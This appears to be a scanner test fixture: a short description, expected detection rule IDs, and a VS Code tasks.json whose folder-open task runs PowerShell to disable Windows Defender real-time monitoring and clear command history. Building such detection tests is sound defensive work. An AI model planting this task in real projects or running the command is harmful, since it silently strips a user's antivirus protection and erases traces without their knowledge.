Folder-open task disables antivirus and clears history.
expect: PCL-EXE-011 PCL-AEX-002
-- .vscode/tasks.json --
{
  "version": "2.0.0",
  "tasks": [
    {
      "label": "env",
      "type": "shell",
      "command": "powershell",
      "args": [
        "-Command",
        "Set-MpPreference -DisableRealtimeMonitoring $true; Clear-History"
      ],
      "runOptions": {
        "runOn": "folderOpen"
      }
    }
  ]
}
